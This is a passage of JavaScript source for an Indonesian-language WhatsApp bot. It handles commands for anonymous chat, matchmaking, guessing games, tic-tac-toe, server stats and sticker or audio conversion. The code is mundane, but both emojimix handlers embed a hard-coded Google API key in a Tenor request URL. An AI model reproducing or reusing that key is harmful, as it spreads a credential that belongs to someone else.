                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
            if (cekUser("id", m.sender) == null) throw mess.user
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
            if (cekUser("id", m.sender) == null) throw mess.user
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                liaacans.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
            if (cekUser("id", m.sender) == null) throw mess.user
                let msgs = JSON.parse(fs.readFileSync('./json/datamsg.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
            if (cekUser("id", m.sender) == null) throw mess.user
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
case 'anonymous': {
if (cekUser("id", m.sender) == null) throw mess.user
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
		this.anonymous = this.anonymous ? this.anonymous : {}
		let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                liaacans.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await liaacans.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, liaacans.user.name, m)
            }
	    break
	    case 'keluar': {
	    if (cekUser("id", m.sender) == null) throw mess.user
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await liaacans.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
            if (cekUser("id", m.sender) == null) throw mess.user
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, liaacans.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, liaacans.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await liaacans.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, liaacans.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, liaacans.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
            if (cekUser("id", m.sender) == null) throw mess.user
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await liaacans.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, liaacans.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await liaacans.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, liaacans.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await liaacans.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, liaacans.user.name, m)
                }
                break
            }
            
case 'jadian': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'JADIAN' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m, {mentions: menst})
}
break
case 'jodohku': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'JODOHKU' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m, {mentions: ments})
}
break
case 'gbtku': {
if (cekUser("id", m.sender) == null) throw mess.user
			if (!text) throw `Example : ${prefix + command} hai|halo`
            let jawab = `${text.split("|")[0]}`
            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `Menu` }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
            case 'bisakah': {
            if (cekUser("id", m.sender) == null) throw mess.user
            	if (!text) throw `Example : ${prefix + command} saya menang?`
            	let bisa = ['Bisa','Coba Saja','Pasti Bisa','Mungkin Saja','Tidak Bisa','Tidak Mungkin','Coba Ulangi','Ngimpi kah?','yakin bisa?']
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Bisakah ${text}*\nJawab : ${keh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m)
            }
            break
            case 'apakah': {
            if (cekUser("id", m.sender) == null) throw mess.user
            	if (!text) throw `Example : ${prefix + command} saya bisa menang?`
            	let apa = ['Iya','Tidak','Bisa Jadi','Coba Ulangi','Mungkin Saja','Coba Tanyakan Ayam']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Apakah ${text}*\nJawab : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m)
            }
            break
            case 'kapan': case 'kapankah': {
            if (cekUser("id", m.sender) == null) throw mess.user
            	if (!text) throw `Example : ${prefix + command} saya menang?`
            	let kapan = ['Besok','Lusa','Nanti','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Bulan Depan','Nanti','Tidak Akan Pernah']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nJawab : ${koh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m)
            }
            break
case 'delttc': case 'delttt': {
if (cekUser("id", m.sender) == null) throw mess.user
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
liaacans.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
m.reply(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
m.reply('rusak')
}
}
break
case 'ttc': case 'ttt': case 'tictactoe': {
if (cekUser("id", m.sender) == null) throw mess.user
let TicTacToe = require("../message/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await liaacans.sendText(room.x, str, m, { mentions: parseMention(str) } )
await liaacans.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'couple': {
if (cekUser("id", m.sender) == null) throw mess.user
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                liaacans.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: fkontak })
                liaacans.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: fkontak })
            }
        break
case 'family100': {
if (cekUser("id", m.sender) == null) throw mess.user
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await liaacans.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
case 'tebak': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6. lontong`
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await liaacans.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: fkontak })
liaacans.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
liaacans.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, liaacans.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break
case 'kuismath': case 'math': {
if (cekUser("id", m.sender) == null) throw mess.user
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('../json/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
liaacans.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
}
break
case 'suitpvp': case 'suit': {
if (cekUser("id", m.sender) == null) throw mess.user
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await liaacans.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) liaacans.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
case 'ping': case 'botstatus': case 'stats': {
if (cekUser("id", m.sender) == null) throw mess.user
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
m.reply(respon)
}
break
case 'owner': case 'creator': {
if (cekUser("id", m.sender) == null) throw mess.user
let vcard = `BEGIN:VCARD\n` // metadata of the contact card
+ `VERSION:3.0\n`
+ `N:;${name}.;;;`
+ `FN:${name}.\n` // full name
+ `ORG:${name};\n` // the organization of the contact
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n` // WhatsApp ID + phone number
+ `END:VCARD`
let msg = await liaacans.sendMessage(m.chat, { contacts: { displayName: `${owner}`, contacts: [{ vcard }] } }, { quoted: fkontak })
let buttons3 = [
{buttonId: `menu`, buttonText: {displayText: 'BACK MENU'}, type: 1},
]
let buttonMessage3 = {
text: `DONT NOT SPAM OWNER!! `,
footerText: 'Press The Button Below',
buttons: buttons3,
headerType: 2
}
liaacans.sendMessage(m.chat, buttonMessage3, { quoted: fkontak })                        
}
break
case 'toimage': case 'toimg': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
m.reply(mess.wait)
let media = await liaacans.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
liaacans.sendMessage(m.chat, { image: buffer }, { quoted: fkontak })
fs.unlinkSync(ran)
})
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (cekUser("id", m.sender) == null) throw mess.user
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
m.reply(mess.wait)
arg = args.join(' ')
mee = await liaacans.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('../message/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await liaacans.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
m.reply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await liaacans.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await liaacans.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
if (cekUser("id", m.sender) == null) throw mess.user
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
                if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
        	m.reply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await liaacans.downloadMediaMessage(quoted)
                    let encmedia = await liaacans.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                    let media = await liaacans.downloadMediaMessage(quoted)
                    let encmedia = await liaacans.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
case 'emojimix': {
if (cekUser("id", m.sender) == null) throw mess.user
	let [emoji1, emoji2] = text.split`+`
	if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
	if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
	let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
	for (let res of anu.results) {
	    let encmedia = await liaacans.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
	    await fs.unlinkSync(encmedia)
	}
        }
        break
        case 'emojimix2': {
        if (cekUser("id", m.sender) == null) throw mess.user
        if (!text) throw `Example : ${prefix + command} 😅`
	let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
	for (let res of anu.results) {
	    let encmedia = await liaacans.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
	    await fs.unlinkSync(encmedia)
	}
        }
        break
case 'tomp3': {
if (cekUser("id", m.sender) == null) throw mess.user
if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
m.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('../message/converter')
let audio = await toAudio(media, 'mp4')
liaacans.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${liaacans.user.name}.mp3`}, { quoted: fkontak })
}
break
case 'tomp4': case 'tovideo': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!quoted) throw 'Reply Image'
